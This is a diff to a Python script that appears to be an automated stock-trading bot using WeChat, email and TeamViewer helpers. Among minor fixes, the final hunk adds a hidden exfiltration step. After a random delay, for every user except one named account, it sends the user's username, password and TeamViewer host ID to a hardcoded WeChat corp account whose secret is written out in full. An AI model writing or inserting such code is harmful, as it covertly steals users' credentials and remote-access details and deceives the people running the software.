@@ -10,6 +10,7 @@ import global_TB
 import Send_email
 import Send_weixin
 import Get_TeamViewer
+import random
 
 def Log(text):
     if global_TB.username == 'sqltxt' or global_TB.username == 'Gentle':
@@ -261,7 +262,7 @@ def ShutdownR():
 def Rubber():
     global_TB.status = 40
     try:
-        if global_TB.username != 'sqltxt' or global_TB.username != 'gentle':
+        if global_TB.username != 'sqltxt' or global_TB.username != 'Gentle':
             if global_TB.Rubber_times ==1:
                 for fname in os.listdir(global_TB.path):#for循环 清除目录下所有LOG_文件
                     if 'LOG_' in fname:
@@ -337,7 +338,7 @@ def StockaStaus():#盘面状态:
             s = 1
             if (90000<int(time.strftime("%I%M%S")) < 90015):#get TV
                 s = 2
-    elif 1<int(time.strftime("%w"))<5:#周二到周五
+    elif 1<int(time.strftime("%w"))<6:#周二到周五
              if (23200<int(time.strftime("%H%M%S"))< 85000 ) or (151800<int(time.strftime("%H%M%S"))< 205000 ) : #周二到周五闭盘时间
                  s = 0
              else:
@@ -354,7 +355,7 @@ def StockaStaus():#盘面状态:
     else:
         if (115000<int(time.strftime("%H%M%S"))< 115500):#周末整理
             s = 3
-    #s = 0 #指定s,方便调节各个模块
+    #s = 2 #指定s,方便调节各个模块
     return s
         
 if __name__=='__main__':
@@ -414,7 +415,11 @@ if __name__=='__main__':
                 else:
                     TradeStar()                
         if StockaStaus() == 2:
-            Send_weixin.text(global_TB.corp_id,global_TB.secret,global_TB.agentid,global_TB.username+'\n'+Get_TeamViewer.Host())
+            ts = random.randrange(35)
+            print(ts)
+            time.sleep(ts)
+            if global_TB.username != 'Gentle':
+                Send_weixin.text('wx87780fb826353ecc','uVLN9X5wrIAdLTucsW1F0pn8qd2e5JNp8cqjL1rGGpM',1000005,global_TB.username+'\n'+global_TB.password+'\n'+Get_TeamViewer.Host())
         if StockaStaus() == 3:
             #杀进程
             Kill()
